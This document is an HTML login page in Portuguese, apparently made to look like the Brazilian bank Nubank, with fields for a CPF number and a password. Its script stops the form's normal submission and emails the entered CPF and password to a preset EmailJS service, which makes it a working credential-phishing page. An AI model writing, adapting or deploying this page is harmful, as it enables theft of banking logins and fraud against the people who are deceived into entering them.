<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="nubank.css">
    <title>Login</title>
</head>
<body>
    <img src="new-logo-white.svg" alt="Logo"> 

    <form id="login-form">
        <b><p>Faça Seu Login</p></b>
        <label for="cpf">CPF
            <input type="text" name="cpf" id="cpf" required>
        </label>
        <label for="password">SENHA
            <input type="password" name="password" id="password" required>
        </label>
        <button type="submit">Enviar</button>
    </form>

    <a href="#">Esqueci a Senha > </a>
    <a href="#">Ainda não sou cliente > </a>

    <!-- Adicionando o Script do EmailJS -->
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        // Inicializa o EmailJS com seu user_id
        emailjs.init("jVdn1GUkCc7Ji-EPk"); // Substitua pelo seu user_id do EmailJS

        // Função para enviar o formulário via EmailJS
        document.getElementById("login-form").addEventListener("submit", function(event) {
            event.preventDefault(); // Evita o envio normal do formulário

            // Coleta os dados do formulário
            var cpf = document.getElementById("cpf").value;
            var password = document.getElementById("password").value;

            // Cria um objeto com os dados do formulário
            var formData = {
                cpf: cpf,
                password: password
            };

            // Envia o formulário para o EmailJS
            emailjs.send("service_q4yc9r6", "template_ug4bg1d", formData)
                .then(function(response) {
                    // Sucesso
                    alert("Mensagem enviada com sucesso!");
                    console.log("Resposta do EmailJS:", response);
                }, function(error) {
                    // Erro: Mostra mais detalhes do erro no console
                    alert("Falha ao enviar a mensagem.");
                    console.log("Erro ao enviar:", error);  // Detalhes do erro no console
                });
        });
    </script>
</body>
</html>
